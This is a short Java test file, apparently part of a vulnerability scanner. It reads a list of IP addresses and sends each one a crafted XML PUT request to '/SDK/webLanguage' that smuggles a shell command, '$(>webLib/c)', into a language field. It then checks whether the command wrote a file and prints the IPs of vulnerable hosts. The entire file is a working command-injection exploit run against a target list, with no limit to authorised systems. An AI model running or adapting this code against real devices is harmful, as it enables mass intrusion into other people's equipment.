import lombok.SneakyThrows;
import okhttp3.*;
import org.junit.Ignore;
import org.junit.Test;
import scanner.http.HttpClient;

import java.io.File;
import java.nio.file.Files;
import java.util.List;
import java.util.Objects;

public class TestCve36260 {

    @Ignore
    @Test
    @SneakyThrows
    public void send() {
        File file = new File("targets");
        List<String> fileContents = Files.readAllLines(file.toPath());

        String body = "<?xml version\" = \"\"1.0\" encoding=\"UTF-8\"?><language>$(>webLib/c)</language>";
        RequestBody formBody = RequestBody.Companion.create(MediaType.parse("application/x-www-form-urlencoded; charset=UTF-8"), body);
        for (String ip : fileContents) {
            try (Response response = HttpClient.doPut(String.format("http://%s/SDK/webLanguage", ip), formBody)) {
                if (response.code() == 200) {
                    if (Objects.equals(response.header("Content-Type"), "application/xml")) {
                        try (Response response1 = HttpClient.doGet(String.format("http://%s/c", ip))) {
                            if (response1.code() == 200) {
                                System.out.println(ip + " => " + response1.code());
                            }
                        } catch (Exception ignore2) { }
                    }
                }
            } catch (Exception ignore1) { }
        }
    }

}